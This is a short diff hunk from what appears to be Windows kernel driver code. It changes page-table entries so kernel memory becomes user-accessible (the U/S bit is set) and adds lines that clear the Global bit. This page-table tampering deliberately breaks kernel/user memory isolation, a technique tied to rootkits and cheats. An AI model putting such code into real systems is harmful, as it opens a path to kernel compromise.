@@ -391,12 +391,15 @@ VOID Modify2UserMem()
 					*Pde |= 4;
 					*Ppe |= 4;
 					*Pxe |= 4;
+					*Pte  &= (~0x100);
+					*Pde  &= (~0x100);
 				}
 				else if (MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//2m page
 				{
 					*Pde |= 4;
 					*Ppe |= 4;
 					*Pxe |= 4;
+					*Pde &= (~0x100);
 				}
 				else if (MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//1g page
 				{
